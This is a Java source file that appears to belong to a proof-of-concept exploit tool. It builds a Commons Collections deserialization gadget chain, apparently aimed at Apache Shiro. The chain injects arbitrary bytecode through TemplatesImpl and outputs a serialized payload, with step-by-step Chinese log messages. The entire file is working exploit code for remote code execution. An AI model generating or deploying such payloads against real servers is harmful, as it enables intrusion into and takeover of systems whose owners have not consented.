package POC_macker.CCShiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsShiro extends Get_poc {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        System.out.println("    杂合链Gadget:\n" +
                "       java.util.HashMap#readObject\n" +
                "       java.util.HashMap#hash\n" +
                "       java.util.HashMap#key.hashCode\n" +
                "       org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode\n" +
                "       org.apache.commons.collections.keyvalue.TiedMapEntry#getValue\n" +
                "       org.apache.commons.collections.keyvalue.TiedMapEntry#map.get\n" +
                "       org.apache.commons.collections.map.LazyMap#get\n" +
                "       org.apache.commons.collections.map.LazyMap#factory.transform\n" +
                "       org.apache.commons.collections.functors.InvokerTransformer#transform\n" +
                "       java.lang.reflect.Method.invoke\n" +
                "       com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer");

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        System.out.println("1.TemplatesImpl对象已创建");

        Transformer invokertransformer = new InvokerTransformer("getClass", null, null);
        System.out.println("2.InvokerTransformer对象已创建");

        Map under_HashMap = new HashMap();
        Map decorate_LazyMap = LazyMap.decorate(under_HashMap, invokertransformer);
        System.out.println("3.LazyMap对象已创建");

        TiedMapEntry tiedMap = new TiedMapEntry(decorate_LazyMap, obj);
        System.out.println("4.TiedMapEntry对象已创建");

        Map expMap = new HashMap();
        expMap.put(tiedMap, "valuevalue");
        System.out.println("5.HashMap对象已创建");

        decorate_LazyMap.clear();
        setFieldValue(invokertransformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        System.out.println("6.HashMap对象序列化数据流返回");
        return barr.toByteArray();
    }
}
